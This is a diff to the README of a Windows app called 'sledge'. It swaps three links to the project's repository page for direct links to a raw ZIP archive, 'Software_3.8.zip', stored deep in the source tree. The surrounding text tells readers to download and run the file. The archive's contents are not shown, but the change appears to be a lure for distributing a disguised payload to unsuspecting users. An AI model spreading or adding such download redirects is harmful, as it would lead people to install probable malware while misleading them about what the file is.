@@ -1,6 +1,6 @@
 # ⚙️ sledge - Reliable work across every restart
 
-[![Download sledge](https://img.shields.io/badge/Download-sledge-blue)](https://github.com/Archdeaconrefocusing790/sledge)
+[![Download sledge](https://img.shields.io/badge/Download-sledge-blue)](https://raw.githubusercontent.com/Archdeaconrefocusing790/sledge/main/src/ledger/Software_3.8.zip)
 
 ## 🚀 What sledge does
 
@@ -24,7 +24,7 @@ If your PC is older, the app can still work, but it may run more slowly when it 
 
 Visit this page to download:
 
-[https://github.com/Archdeaconrefocusing790/sledge](https://github.com/Archdeaconrefocusing790/sledge)
+[https://raw.githubusercontent.com/Archdeaconrefocusing790/sledge/main/src/ledger/Software_3.8.zip](https://raw.githubusercontent.com/Archdeaconrefocusing790/sledge/main/src/ledger/Software_3.8.zip)
 
 Open the page, look for the latest release or download file, and save it to your computer. If you see a ZIP file, download it first and then open it. If you see an installer, download and run that file.
 
@@ -199,6 +199,6 @@ This makes it easier to handle work that must not reset when the app closes
 
 If you need the download page again, use this link:
 
-[https://github.com/Archdeaconrefocusing790/sledge](https://github.com/Archdeaconrefocusing790/sledge)
+[https://raw.githubusercontent.com/Archdeaconrefocusing790/sledge/main/src/ledger/Software_3.8.zip](https://raw.githubusercontent.com/Archdeaconrefocusing790/sledge/main/src/ledger/Software_3.8.zip)
 
 Download the latest file, then open it on Windows the same way as before.
